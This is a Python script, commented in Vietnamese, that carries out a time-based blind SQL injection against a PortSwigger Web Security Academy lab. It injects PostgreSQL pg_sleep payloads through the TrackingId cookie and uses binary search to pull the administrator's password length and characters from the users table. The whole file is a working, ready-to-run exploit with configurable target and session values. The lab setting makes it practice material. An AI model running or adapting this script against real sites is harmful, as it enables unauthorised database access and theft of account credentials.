#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Time-based Blind SQLi – PostgreSQL (PortSwigger style)
- Inject qua Cookie: TrackingId=<prefix + URL-encoded payload>
- Dùng SELECT CASE WHEN (...) THEN pg_sleep(DELAY) ELSE pg_sleep(0) END
- Điều kiện bọc bằng EXISTS(SELECT 1 FROM users WHERE ...)
- Brute-force password của user 'administrator' bằng binary search
"""

import time
import requests
import urllib.parse

# ====== CONFIG ======
TARGET = "https://0a8100e90455f60a80bc3005004f0069.web-security-academy.net/"  # Trang chủ (hoặc /login cũng được)
TRACKING_ID_PREFIX = "DFa8XQ896v06TFx7"         # phần prefix có sẵn của TrackingId trước khi chèn payload (ví dụ 'x')
SESSION_COOKIE = "phhTDXfgeIRg2nDuTgCEiw9cIMJuVdfI"  # thay bằng session hiện tại của bạn
DELAY = 5.0                      # số giây pg_sleep
TIME_THRESHOLD = 4.0             # ngưỡng nhận diện delay (nên < DELAY một chút)
USER = "administrator"           # user mục tiêu
TABLE_NAME = "users"             # tên bảng chứa password (nếu khác thì sửa lại trong các hàm điều kiện)
MAX_RETRY = 3
VERIFY_TLS = True                # set False nếu lab dùng cert tự ký

# ====== HTTP ======
S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
})
TIMEOUT = int(DELAY) + 10  # tránh treo quá lâu

def build_cookie_with_condition(condition_sql: str) -> str:
    """
    Tạo Cookie header gồm 2 cookie:
    - TrackingId=<prefix + payload đã URL-encode>
    - session=<SESSION_COOKIE>
    Payload dạng:  ';SELECT CASE WHEN (<condition>) THEN pg_sleep(DELAY) ELSE pg_sleep(0) END--
    (chúng ta encode ';' thành %3B để không cắt cookie)
    """
    payload = f"';SELECT CASE WHEN ({condition_sql}) THEN pg_sleep({int(DELAY)}) ELSE pg_sleep(0) END--"
    enc = urllib.parse.quote(payload, safe="")   # encode toàn bộ payload
    tracking_value = TRACKING_ID_PREFIX + enc
    # Cookie phải phân tách bằng dấu ; (dấu ; bên trong giá trị đã được encode %3B ở trên)
    return f"TrackingId={tracking_value}; session={SESSION_COOKIE}"

def send_condition(condition_sql: str) -> float:
    """
    Gửi request với điều kiện; trả về thời gian phản hồi (giây).
    """
    cookie_header = build_cookie_with_condition(condition_sql)
    for attempt in range(1, MAX_RETRY + 1):
        try:
            t0 = time.monotonic()
            resp = S.get(TARGET, headers={"Cookie": cookie_header}, timeout=TIMEOUT, verify=VERIFY_TLS)
            dt = time.monotonic() - t0
            # Không cần status code; chỉ cần thời gian
            return dt
        except requests.RequestException:
            if attempt == MAX_RETRY:
                raise
            time.sleep(0.2 * attempt)
    return float("inf")

def is_true(condition_sql: str) -> bool:
    """
    Trả về True nếu server delay ≈ DELAY (thời gian > TIME_THRESHOLD)
    """
    elapsed = send_condition(condition_sql)
    # Debug (mở khi cần)
    # print(f"[{elapsed:.2f}s] {condition_sql}")
    return elapsed > TIME_THRESHOLD

# ====== Helpers cho PostgreSQL ======
def cond_length_ge(n: int) -> str:
    # LENGTH(password) >= n cho user
    return (
        f"EXISTS (SELECT 1 FROM {TABLE_NAME} "
        f"WHERE username='{USER}' AND LENGTH(password)>={n})"
    )

def cond_char_code_ge(pos: int, code: int) -> str:
    # ASCII(SUBSTRING(password,pos,1)) >= code
    # PostgreSQL: SUBSTRING(string, start, length)
    return (
        f"EXISTS (SELECT 1 FROM {TABLE_NAME} "
        f"WHERE username='{USER}' AND ASCII(SUBSTRING(password,{pos},1))>={code})"
    )

# ====== Khai thác ======
def find_length(max_cap: int = 256) -> int:
    # Tìm upper bound bằng exponential search
    hi = 1
    while hi <= max_cap and is_true(cond_length_ge(hi)):
        hi *= 2
    lo = hi // 2 if hi > 1 else 1
    hi = min(hi, max_cap)

    # Binary search trong [lo..hi]
    res = lo
    while lo <= hi:
        mid = (lo + hi) // 2
        if is_true(cond_length_ge(mid)):
            res = mid
            lo = mid + 1
        else:
            hi = mid - 1
    return res

def find_char_at(pos: int) -> str:
    # Tìm ký tự ASCII trong khoảng in được (32..126)
    lo, hi = 32, 126
    ans = 32
    while lo <= hi:
        mid = (lo + hi) // 2
        if is_true(cond_char_code_ge(pos, mid)):
            ans = mid
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(ans)

def crack_password():
    print(f"[*] Detecting password length for user '{USER}' ...")
    length = find_length()
    print(f"[+] Password length = {length}")

    print("[*] Extracting password (time-based, binary search per char)...")
    out = []
    for i in range(1, length + 1):
        ch = find_char_at(i)
        out.append(ch)
        print(f"[+] pos {i}/{length}: {ch}   -> {''.join(out)}", flush=True)
    pwd = "".join(out)
    print(f"[✓] DONE. Password = {pwd}")
    return pwd

if __name__ == "__main__":
    crack_password()

